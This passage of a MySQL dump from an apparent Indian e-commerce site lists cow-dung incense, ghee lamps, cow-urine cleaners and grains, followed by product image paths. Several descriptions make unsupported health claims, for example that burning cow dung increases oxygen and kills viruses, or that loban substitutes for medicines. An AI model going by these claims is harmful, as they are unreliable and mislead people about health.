(86, 12, 39, 0, 'Cow Dung Powder', '', 'cow-dung-powder', 1, 1, '0009', 0, '<p>Cow Dung Powder is made with desi breed cow\'s dung, powder mixed with some special composition to get you the best aroma all over your office or home. Light a Kanda (Cow dung Cake) and then put some powder over the cow dung cake. It will gradually burn along with the powder.</p>\r\n<p>&nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Desi cow dung</p>', 1, '2022-04-08 09:50:07', '2022-08-23 04:55:30', 1, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(91, 9, 41, 0, 'Gou Clean Phenoyl', '', 'gou-clean-phenoyl', 1, 1, 'GA/GCP/01', 0, '<p>Distilled desi cow urine acts as a natural anti microbial agent. This floor cleaner is organic and eco friendly, making it safe for children and pets.</p>\r\n<p><br />Method: Extract of desi cow urine, cow dung rasam &amp; other ingredients are added with pine oil for making the concentrate of phenoyl. Once the concentrate is made, neem leaves are boiled with water for 2 hours and then essence is added to that with require flavours and<br />mixed for more than an hour.</p>\r\n<p><br />Ingredients:</p>\r\n<ul>\r\n<li>Distilled Desi Cow Urine</li>\r\n<li>Pine Oil</li>\r\n<li>Natural extracts</li>\r\n<li>Goumutra Arka</li>\r\n<li>Neem extract</li>\r\n</ul>', 1, '2022-07-18 06:36:26', '2022-11-15 05:39:02', 0, 0, '', '', 0, 0, 0, '18%', 0, '<p>Add 15ml Gou-Clean to 1Ltr of Water. Shake well before Use</p>', '', '', ''),
(116, 13, 45, 0, 'Long Grain White Rice', '', 'long-grain-white-rice', 1, 1, 'GA/OP/R/LG', 0, '<p>Description</p>', 1, '2022-08-03 05:35:13', '2022-08-10 06:35:06', 0, 1, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(89, 12, 42, 0, 'Chandan Sambrani Cone', '', 'chandan-sambrani-cone', 1, 1, 'GA/GP/CSC/CSC', 0, '<p>These Chandan cones is an exquisite collection of dhoop cones, carefully developed with essential oils and other natural aromatic substances made without using charcoal. They are healthy and safe and act as one of the best stress relievers. The rich fragrance of sandalwood creates a pleasant ambiance with a divine feel. These cones are ideal for daily puja, meditation, and to use in havan. It is considered an essential item on the list for all religious rituals.<br />Burning cowdung dhoop cones helps to purify the air in the area and serves as a natural mosquito repellant.<br /><br /><strong>Ingredients: </strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural Herbs</li>\r\n<li>Chandan Aroma</li>\r\n</ul>', 1, '2022-07-18 05:51:42', '2022-11-07 12:16:03', 0, 0, '', '', 0, 1, 0, '5%', 0, '<p>Light the tip of the Dhoop Cone and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Cone holder.</p>', '', '', ''),
(117, 13, 45, 0, 'Parboiled Rice', '', 'parboiled-rice', 1, 1, 'GA/OP/R/PR', 0, '<p>Description</p>', 1, '2022-08-03 05:35:58', '2022-08-10 06:36:00', 0, 1, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(118, 13, 46, 0, 'Red Adzuki Beans', '', 'red-adzuki-beans', 1, 1, 'GA/OP/P/RAB', 0, '<p>Description</p>', 1, '2022-08-03 09:54:39', '2022-08-10 06:37:48', 0, 1, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(119, 13, 46, 0, 'Red Organic Kidney Beans', '', 'red-organic-kidney-beans', 1, 1, 'GA/OP/P/ROKB', 0, '<p>Description</p>', 1, '2022-08-03 09:55:25', '2022-08-10 06:39:22', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(120, 13, 46, 0, 'Soya Beans', '', 'soya-beans', 1, 1, 'GA/OP/P/SB', 0, '<p>Description</p>', 1, '2022-08-03 09:58:41', '2022-08-10 06:43:18', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(95, 12, 42, 0, 'Godhan Sambrani Cone', '', 'incense-sambrani-cone', 1, 1, 'GA/GP/CSC/GDSC', 0, '<p>These Godhan cones is an exquisite collection of dhoop cones, carefully developed with essential oils and other natural aromatic substances made without using charcoal. They are healthy and safe and act as one of the best stress relievers. The rich fragrance of godhan creates a pleasant ambiance with a divine feel. These cones are ideal for daily puja, meditation, and to use in havan. It is considered an essential item on the list for all religious rituals.<br />Burning cowdung dhoop cones helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Godhan Aroma.</li>\r\n</ul>', 1, '2022-07-18 07:30:32', '2022-11-11 09:55:30', 1, 0, '', '', 0, 0, 0, '', 0, '<p>Light the tip of the Dhoop Cone and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Cone holder.</p>', '', '', ''),
(98, 12, 43, 0, 'Ghee Batti', '', 'ghee-bhathi', 1, 1, 'PI/GB/01', 0, '<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"13\">Lighting Cow Ghee Deepam is supposed to increase the sattvic tattva, which includes light, bliss, and goodness. A sattvic mind is always steady and blissful internally. It is a <span class=\"red-underline\" data-startindex=\"177\" data-endindex=\"184\" data-paragraphid=\"13\">practice</span> to light Cow&rsquo;s Ghee Diya for health, wealth, and happiness.&nbsp;Pure Cow Ghee <span class=\"red-underline\" data-startindex=\"260\" data-endindex=\"264\" data-paragraphid=\"13\">bathi</span> made from cow ghee is a convenient and apt replacement for traditional ghee lamps. These Pure Cow Ghee bathis have a burning time of 20<span class=\"red-underline\" data-startindex=\"401\" data-endindex=\"401\" data-paragraphid=\"13\">-</span>30 minutes. <span class=\"red-underline\" data-startindex=\"414\" data-endindex=\"418\" data-paragraphid=\"13\">Place</span> these Diya Bhathis in a lamp and light them.</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow ghee,</li>\r\n<li>Paraffin wax &amp; vegetable oil.</li>\r\n</ul>\r\n<p class=\"root-block-node\" data-changed=\"false\" data-paragraphid=\"13\">&nbsp;</p>\r\n<p class=\"root-block-node\" data-changed=\"true\" data-paragraphid=\"14\">&nbsp;</p>', 1, '2022-07-18 08:44:46', '2022-08-23 04:55:49', 1, 0, '', '', 0, 0, 0, '18', 0, '<p>Place the ghee bathi on the Diya&rsquo;s or aarti and light them with a matchstick.&nbsp;</p>', '', '', ''),
(99, 12, 27, 0, 'Mogra Dhoop Sticks', '', 'mogra-dhoop-sticks', 1, 1, 'PI/MDS/01', 0, '<p>Divinity &amp; Spiritualism have many forms. When it comes to paying respects to the almighty, you can take a unique course and spread the sweet smell of natural mogra with Mogra sticks. &nbsp;Mogra Incense Sticks fill the room with a pleasant flowery scent of fresh Mogra. The incense stick sets a unique trail of its sweet and strong fragrance.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Mogra Aroma.</li>\r\n</ul>', 1, '2022-07-18 08:57:36', '2022-10-27 12:10:53', 0, 0, '', '', 0, 0, 0, '', 0, '<p>Light the tip of the Dhoop Stick and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Stick holder.</p>', '', '', ''),
(100, 12, 27, 0, 'Lobhan Dhoop Sticks', '', 'loban-dhoop-sticks', 1, 1, 'PI/LDS/01', 0, '<p>Loban incense is the simplest, purest, and most economical way to make your living space fragrant. Incense is widely described in ancient Sanskrit scriptures and has been credited with pleasing the gods. Loban is one of the exquisite gifts of nature that is used as a natural substitute for various medicines. It is ideal for creating a calming atmosphere at home or at the office. Perfect for pujas, aroma therapy, and meditation.</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>joss</li>\r\n<li>Natural herbs and Loban Sambrani.</li>\r\n</ul>', 1, '2022-07-18 09:01:42', '2022-11-07 12:35:17', 0, 0, '', '', 0, 0, 0, '5%', 0, '<p>Hold the Agarbathi at the uncovered end of the stick and light the other end using a matchstick. Hold the flame for some time until the stick ignites. If you see a glowing amber, then the incense stick is burning properly. If the agarbathi is still burning even after seeing the amber, then gently blow out the flame. Keep the burning stick away from flammable materials.</p>', '', '', ''),
(101, 12, 27, 0, 'Godhan Dhoop Sticks', '', 'godhan-dhoop-sticks', 1, 1, 'PI/GHDS/01', 0, '<p>Their unique properties include panchagavya (DESI cow derivatives), and soothing fragrance from aromatic plant extracts. This ancient formula helps to purify your home as well as to create a stress-free mind and pleasant environment.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Godhan Aroma.</li>\r\n</ul>', 1, '2022-07-18 09:12:18', '2022-10-27 11:58:43', 0, 0, '', '', 0, 0, 0, '', 0, '<p>Light the tip of the Dhoop Stick and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Stick holder.</p>', '', '', ''),
(102, 12, 27, 0, 'Lavender Dhoop Sticks', '', 'lavendar-dhoop-sticks', 1, 1, 'PI/LDS/01', 0, '<p>The sweet, floral aroma of Lavender is the best way to release stress and relax your body and mind. Lavender has a delightfully gentle scent that soothes and freshens the mind. Lavender is also commonly used for Aromatherapy, Home fragrance, Meditation, Yoga etc,.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Lavender Aroma</li>\r\n</ul>', 1, '2022-07-18 09:16:52', '2022-11-07 12:35:44', 0, 0, '', '', 0, 0, 0, '5%', 0, '<p>Light the tip of the Dhoop Stick and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Stick holder.</p>', '', '', ''),
(103, 12, 27, 0, 'Chandan Dhoop Sticks', '', 'chandan-dhoop-sticks', 1, 1, 'PI/CDS/01', 0, '<p>Chandan holds a venerated position. Its touch on the human body is cooling and pacifying, its fragrance is purifying. The rich fragrance of sandalwood creates a pleasant ambience with a divine feel. Experience the pure tradition at your home with these Chandan sticks.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Chandan Aroma.</li>\r\n</ul>', 1, '2022-07-18 09:21:47', '2022-11-07 12:32:50', 0, 0, '', '', 0, 0, 0, '5%', 0, '<p>Light the tip of the Dhoop Stick and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Stick holder.</p>', '', '', ''),
(104, 12, 27, 0, 'Gulab Dhoop Sticks', '', 'gulab-dhoop-sticks', 1, 1, 'PI/GLDS/01', 0, '<p>Gulab has always been in first position while offering pooja. Experience the pure tradition at your home with Gulab sticks. The pleasant, mild fragrance of Gulab is infinitely desirable. Gulab sticks create a pleasant ambience. Experience the traditional fragrance for peace and prosperity at your home with these Gulab sticks.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Gulab Aroma.</li>\r\n</ul>', 1, '2022-07-18 09:26:03', '2022-11-07 12:34:18', 0, 0, '', '', 0, 1, 0, '5%', 0, '<p>Light the tip of the Dhoop Stick and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Stick holder.</p>', '', '', ''),
(105, 12, 27, 0, 'Jasmine Dhoop Sticks', '', 'jasmine-dhoop-sticks', 1, 1, 'PI/JDS/01', 0, '<p>The well known flower is famed for its fragrance, considered very auspicious. The very elegant fragrance of jasmine is ideal for creating a calming atmosphere at home or workplace.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Jasmine Aroma.</li>\r\n</ul>', 1, '2022-07-18 09:30:43', '2022-11-07 12:36:50', 0, 0, '', '', 0, 1, 0, '5%', 0, '<p>Light the tip of the Dhoop Stick and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Stick holder.</p>', '', '', ''),
(106, 12, 27, 0, 'Gugle Dhoop Sticks', '', 'gugle-dhoop-sticks', 1, 1, 'PI/GDS/01', 0, '<p>Gugle has always been in the first position while offering pooja. Experience the pure tradition at your home with Gugle sticks. The pleasant, mild fragrance of Gugle is infinitely desirable. Gugle sticks create a pleasant ambience. Experience the traditional fragrance for peace and prosperity at your home with these Gugle sticks.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Gugle Sambrani.</li>\r\n</ul>\r\n<p>&nbsp;</p>', 1, '2022-07-18 09:35:52', '2022-11-07 12:33:33', 0, 1, '', '', 0, 0, 0, '5%', 0, '<p>Light the tip of the Dhoop Stick and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Stick holder.</p>', '', '', ''),
(108, 12, 35, 0, 'Cow Dung Hawan Cups', '', 'homa-kunda', 1, 1, 'PI/HK/01', 0, '<p>Burning Homa Kunda cup helps increase oxygen content and purifies the air. Homa Kunda cup are made from natural ingredients for all auspicious occasions and pooja purposes. It is a mixture of 108 selective herbals in which medicinal and divine properties are present.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n</ul>', 1, '2022-07-18 10:17:04', '2022-11-08 05:38:39', 0, 0, '', '', 0, 0, 0, '5%', 0, '<p>Light the tip of the Cowdung Havan Cup and allow the flame to catch. Gently put out the flame with care. Place it on the Cowdung Hawan Cup holder.</p>', '', '', ''),
(109, 12, 42, 0, 'Gugle Sambrani Cone', '', 'gugler-sambrani-cone', 1, 1, 'GA/GP/CSC/GGSC', 0, '<p>Gugle is a traditional Vedic purifying element that is used to spread positivity in homes, places of work, or anywhere. This natural Gugle cone is effective and creates an aura. One feels an intensity positive vibrations while meditating, yoga, or prayer. These cones are ideal for daily puja, meditation, and to use in havan. It is considered an essential item on the list for all religious rituals.<br />Burning cowdung dhoop cones helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural Herbs</li>\r\n<li>Gugle Aroma</li>\r\n</ul>\r\n<p>&nbsp;</p>', 1, '2022-07-18 10:43:28', '2022-11-07 12:22:04', 0, 0, '', '', 0, 0, 0, '5%', 0, '<p>Light the tip of the Dhoop Cone and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Cone holder.</p>', '', '', ''),
(110, 12, 42, 0, 'Gulab Sambrani Cone', '', 'gulab-sambrani-cone', 1, 1, 'GA/GP/CSC/GSC', 0, '<p>The fragrance of gulab serves as a great stress reliever and has the best fragrance. Its remedial aroma lifts the spirits, activates the senses, and transcends one into a happier state. Gulab cones have a calming and soothing effect on your body and mind. Ideal for meditation &amp; Yoga.&nbsp;<br />Burning cowdung dhoop cones helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p><strong>Ingredients:<br /></strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural Herbs</li>\r\n<li>Gulab Aroma</li>\r\n</ul>', 1, '2022-07-18 10:45:17', '2022-11-07 12:22:31', 0, 0, '', '', 0, 0, 0, '5%', 0, '<p>Light the tip of the Dhoop Cone and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Cone holder.</p>', '', '', ''),
(112, 12, 42, 0, 'Lobhan Sambrani Cone', '', 'loban-sambrani-cone', 1, 1, 'GA/GP/CSC/LSC', 0, '<p>Loban is one of the exquisite gifts of nature that is used as a natural substitute for various medicines. Loban is beneficial in relieving cold. It is ideal for creating a positive atmosphere at home or the office. Perfect for pujas, aromatherapy, and meditation.<br />Burning cowdung dhoop cones helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p><br /><strong>Ingredients: </strong></p>\r\n<ul>\r\n<li>Desi Cow Dung</li>\r\n<li>Joss</li>\r\n<li>Natural Herbs</li>\r\n<li>Loban Aroma</li>\r\n</ul>', 1, '2022-07-18 10:51:42', '2022-11-07 12:23:22', 0, 0, '', '', 0, 0, 0, '5%', 0, '<p>Light the tip of the Dhoop Cone and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Cone holder.</p>', '', '', ''),
(113, 12, 42, 0, 'Mogra Sambrani Cone', '', 'mogra-sambrani-cone', 1, 1, 'GA/GP/CSC/MSC', 0, '<p>Divinity &amp; Spiritualism have many forms. When it comes to paying respects to the almighty, you can take a unique course and spread the sweet smell of natural mogra with Mogra sticks. &nbsp;Mogra Incense Sticks fill the room with a pleasant flowery scent of fresh Mogra. The incense stick sets a unique trail of its sweet and strong fragrance.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p><br /><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow Dung</li>\r\n<li>Joss</li>\r\n<li>Natural Herbs</li>\r\n<li>Mogra Aroma</li>\r\n</ul>', 1, '2022-07-18 10:54:33', '2022-11-07 12:37:12', 0, 0, '', '', 0, 0, 0, '5%', 0, '<p>Light the tip of the Dhoop Stick and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Stick holder.</p>', '', '', ''),
(121, 13, 47, 0, 'Wheat', '', 'wheat', 1, 1, 'GA/OP/R/WT', 0, '<p>Description</p>', 1, '2022-08-03 11:33:43', '2022-08-10 06:46:04', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(122, 13, 47, 0, 'Green Buckwheat', '', 'green-buckwheat', 1, 1, 'GA/OP/P/GBW', 0, '', 1, '2022-08-03 11:34:32', '2022-08-10 06:47:43', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(123, 13, 47, 0, 'Corn', '', 'corn', 1, 1, 'GA/OP/C/CN', 0, '', 1, '2022-08-03 11:35:17', '2022-09-26 11:27:46', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(128, 12, 42, 0, 'Kewda Sambrani Cone', '', 'kewda-sambrani-cone', 1, 1, 'SC', 0, '<p>Kewda has always been in the first position while offering pooja. Experience the pure tradition at your home with Kewda sticks. The pleasant, mild fragrance of Kewda is infinitely desirable. They create a pleasant ambiance. Experience the traditional fragrance for peace and prosperity at home.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Kewda Aroma.</li>\r\n</ul>', 1, '2022-11-11 10:10:49', '2022-11-11 10:10:49', 0, 0, '', '', 0, 0, 0, '', 0, '<p>Light the tip of the Sambrani Cone and allow the flame to catch. Gently put out the flame with care. Place it on the Sambrani Cone holder.</p>', '', '', ''),
(129, 12, 42, 0, 'Jasmine Sambrani Cone', '', 'jasmine-sambrani-cone', 1, 1, 'SCC', 0, '<p>The well known flower is famed for its fragrance, considered very auspicious. The very elegant fragrance of jasmine is ideal for creating a calming atmosphere at home or workplace.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Jasmine Aroma.</li>\r\n</ul>', 1, '2022-11-11 10:19:02', '2022-11-11 10:19:02', 0, 0, '', '', 0, 0, 0, '', 0, '<p>Light the tip of the Sambrani Cone and allow the flame to catch. Gently put out the flame with care. Place it on the Sambrani Cone holder.</p>', '', '', ''),
(130, 12, 26, 0, 'Panchagavya Diyas (Single Diya)', '', 'panchagavya-diyas-single-diya', 1, 1, '', 0, '<p>Panchgavya Diya is made of cow dung, gomutra, milk, curd, and ghee. It is 100% natural and biodegradable. It gives a feeling of positivity when burnt. Diya&rsquo;s are very attractive and completely eco-friendly. Burning of Panchgavya Diyas are hygenic and good for the home; it reduces or kills the harmful bacteria and viruses present in the surrounding atmosphere. The burning of Panchgavya diyas removes foul odour also from the surrounding atmosphere. Ash generated from the burning of diyas can be used as an effective fertilizer.</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Cowdung</li>\r\n<li>Gomutra&nbsp;</li>\r\n<li>Milk</li>\r\n<li>Curd</li>\r\n<li>Ghee</li>\r\n</ul>\r\n<p>&nbsp;</p>\r\n<p><strong>These are hand-made cow dung diya so please expect slight variance in the designs, shapes, and overall dimensions.</strong></p>\r\n<p>&nbsp;</p>', 1, '2022-11-11 10:55:03', '2022-11-15 05:41:47', 0, 0, '', '', 0, 0, 0, '5', 0, '<p><strong>Tip: </strong>Use a round cotton wick instead of long wicks to avoid spillage of oil.&nbsp;</p>\r\n<p><span class=\"blue-underline\" data-startindex=\"120\" data-endindex=\"170\" data-paragraphid=\"10\"><strong>Safety Warning:</strong> The diya as a whole is flammable.</span></p>', '', '', ''),
(131, 9, 41, 0, 'Scented Gou Clean Phenoyl', '', 'scented-gou-clean-phenoyl', 1, 1, '', 0, '<p>Distilled desi cow urine acts as a natural anti microbial agent. This floor cleaner is organic and eco friendly, making it safe for children and pets.</p>\r\n<p><br />Method: Extract of desi cow urine, cow dung rasam &amp; other ingredients are added with pine oil for making the concentrate of phenoyl. Once the concentrate is made, neem leaves are boiled with water for 2 hours and then essence is added to that with require flavours and<br />mixed for more than an hour.</p>\r\n<p><br />Ingredients:</p>\r\n<ul>\r\n<li>Distilled Desi Cow Urine</li>\r\n<li>Pine Oil</li>\r\n<li>Natural extracts</li>\r\n<li>Goumutra Arka</li>\r\n<li>Neem extract</li>\r\n</ul>', 1, '2022-11-15 05:41:24', '2022-11-15 05:41:39', 0, 0, '', '', 0, 0, 0, '18', 0, '<p>Add 15ml Gou-Clean to 1Ltr of Water. Shake well before Use</p>', '', '', ''),
(132, 12, 49, 0, 'Mosquito Repellent', '', 'mosquito-repellent', 1, 1, '', 0, '<p>Description :<br />A naturally magical way to keep the mosquitoes away.</p>\r\n<p>Caution :<br />Mosquito Repellent Sticks must only be set up in well-ventilated areas, away from combustible objects, on surfaces that are both fireproof and heat resistant. Keep it away from pets and children. A flaming Mosquito Repellent Stick should never be left alone.</p>\r\n<p>&nbsp;</p>\r\n<p>Ingredients :<br />Aareca, Cowdung, Lavancha, Rla, Nagarmotha, Bhadramushti,<br />Pachkarpura, Clove, Cinnamon.</p>', 1, '2022-11-22 10:14:01', '2022-11-22 10:15:41', 0, 0, '', '', 0, 0, 0, '18', 0, '<p>Light the tip of the Mosquito Repellent Sticks and allow the flame to catch. Gently put out the flame with care. Place it on the Mosquito Repellent Sticks holder.</p>', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `product_images`
--

CREATE TABLE `product_images` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `order_no` int(11) NOT NULL DEFAULT '1',
  `thumb` text NOT NULL,
  `image_path` text NOT NULL,
  `image_medium` text NOT NULL,
  `image_large` text NOT NULL,
  `status` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `image_path2` varchar(2000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `product_images`
--

INSERT INTO `product_images` (`id`, `pid`, `order_no`, `thumb`, `image_path`, `image_medium`, `image_large`, `status`, `user_id`, `created_date`, `modified_date`, `image_path2`) VALUES
(1, 1, 1, './assets/images/demo101649150144.jpg', './assets/images/demo200x24001649150144.jpg', './assets/images/demo400x40001649150144.jpg', 'assets/images/demo800x80001649222620.jpg', 0, 1, '2022-04-05 09:15:44', '2022-04-06 05:40:46', '0'),
(4, 2, 1, './assets/images/arjunadi-gritha101649242405.jpg', './assets/images/arjunadi-gritha200x24001649242405.jpg', './assets/images/arjunadi-gritha400x40001649242405.jpg', 'assets/images/arjunadi-gritha800x80001649244311.jpg', 0, 1, '2022-04-06 10:53:25', '2022-08-03 04:59:26', '0'),
(3, 1, 1, 'assets/images/demo111649222620.jpg', 'assets/images/demo200x24011649222620.jpg', 'assets/images/demo400x40011649222620.jpg', 'assets/images/demo800x80011649223018.jpg', 0, 1, '2022-04-06 05:23:40', '2022-04-06 05:40:46', ''),
(5, 3, 1, './assets/images/c-19-ark101649246118.jpg', './assets/images/c-19-ark200x24001649246118.jpg', './assets/images/c-19-ark400x40001649246118.jpg', '0', 0, 1, '2022-04-06 11:55:18', '2022-08-03 05:00:47', '0'),
(6, 4, 1, 'assets/images/goumutra-arka-plain101658898932.jpg', 'assets/images/goumutra-arka-plain200x24001658898932.jpg', 'assets/images/goumutra-arka-plain400x40001658485672.jpg', 'assets/images/goumutra-arka-plain800x80001658485672.jpg', 0, 1, '2022-04-06 12:04:01', '2022-08-03 05:01:12', '0'),
(7, 5, 1, './assets/images/goumutra-ark-shadabahar101649246938.jpg', './assets/images/goumutra-ark-shadabahar200x24001649246938.jpg', './assets/images/goumutra-ark-shadabahar400x40001649246938.jpg', 'assets/images/goumutra-ark-shadabahar800x80001649307513.jpg', 0, 1, '2022-04-06 12:08:58', '2022-08-03 05:01:50', '0'),
(8, 6, 1, 'assets/images/gomutra-ark-insulin101649247356.jpg', 'assets/images/gomutra-ark-insulin200x24001649247356.jpg', 'assets/images/gomutra-ark-insulin400x40001649247356.jpg', 'assets/images/gomutra-ark-insulin800x80001649247356.jpg', 0, 1, '2022-04-06 12:10:50', '2022-08-03 05:02:22', '0'),
(9, 7, 1, './assets/images/gomutra-ark-simarouba101649247278.jpg', './assets/images/gomutra-ark-simarouba200x24001649247278.jpg', './assets/images/gomutra-ark-simarouba400x40001649247278.jpg', 'assets/images/gomutra-ark-simarouba800x80001649307629.jpg', 0, 1, '2022-04-06 12:14:38', '2022-08-03 05:02:53', '0'),
(10, 8, 1, './assets/images/panchagavya-gritha101649247558.jpg', './assets/images/panchagavya-gritha200x24001649247558.jpg', './assets/images/panchagavya-gritha400x40001649247558.jpg', 'assets/images/panchagavya-gritha800x80001649307719.jpg', 0, 1, '2022-04-06 12:19:18', '2022-08-03 05:03:30', '0'),
(11, 9, 1, 'assets/images/takramrutha101658485974.jpg', 'assets/images/takramrutha200x24001658485974.jpg', 'assets/images/takramrutha400x40001658485974.jpg', 'assets/images/takramrutha800x80001658485974.jpg', 0, 1, '2022-04-06 12:22:33', '2022-08-03 05:03:58', '0'),
(12, 10, 1, 'assets/images/parijatha-ark101658485784.jpg', 'assets/images/parijatha-ark200x24001658485784.jpg', 'assets/images/parijatha-ark400x40001658485784.jpg', 'assets/images/parijatha-ark800x80001658485784.jpg', 0, 1, '2022-04-06 12:27:07', '2022-08-03 05:05:17', '0'),
(13, 11, 1, './assets/images/kanchanahara-ark101649248248.jpg', './assets/images/kanchanahara-ark200x24001649248248.jpg', './assets/images/kanchanahara-ark400x40001649248248.jpg', 'assets/images/kanchanahara-ark800x80001649308043.jpg', 0, 1, '2022-04-06 12:30:48', '2022-08-03 05:06:14', '0'),
(14, 12, 1, 'assets/images/gomutra-asav101658485704.jpg', 'assets/images/gomutra-asav200x24001658485704.jpg', 'assets/images/gomutra-asav400x40001658485704.jpg', 'assets/images/gomutra-asav800x80001658485704.jpg', 0, 1, '2022-04-07 03:51:50', '2022-08-03 05:07:18', '0'),
(15, 13, 1, './assets/images/bal-pal-ras101649303804.jpg', './assets/images/bal-pal-ras200x24001649303804.jpg', './assets/images/bal-pal-ras400x40001649303804.jpg', './assets/images/bal-pal-ras800x80001649303804.jpg', 0, 1, '2022-04-07 03:56:44', '2022-08-03 05:07:50', '0'),
(16, 14, 1, 'assets/images/narisanjeevani-ark-spl101658485747.jpg', 'assets/images/narisanjeevani-ark-spl200x24001658485747.jpg', 'assets/images/narisanjeevani-ark-spl400x40001658485747.jpg', 'assets/images/narisanjeevani-ark-spl800x80001658485747.jpg', 0, 1, '2022-04-07 04:00:55', '2022-08-03 05:10:04', '0'),
(17, 15, 1, './assets/images/narisanjeevani-ark101649304256.jpg', './assets/images/narisanjeevani-ark200x24001649304256.jpg', './assets/images/narisanjeevani-ark400x40001649304256.jpg', './assets/images/narisanjeevani-ark800x80001649304256.jpg', 0, 1, '2022-04-07 04:04:16', '2022-08-03 05:10:35', '0'),
(18, 16, 1, 'assets/images/sarpgandha-ark101658485929.jpg', 'assets/images/sarpgandha-ark200x24001658485929.jpg', 'assets/images/sarpgandha-ark400x40001658485929.jpg', 'assets/images/sarpgandha-ark800x80001658485929.jpg', 0, 1, '2022-04-07 04:07:36', '2022-08-03 05:11:02', '0'),
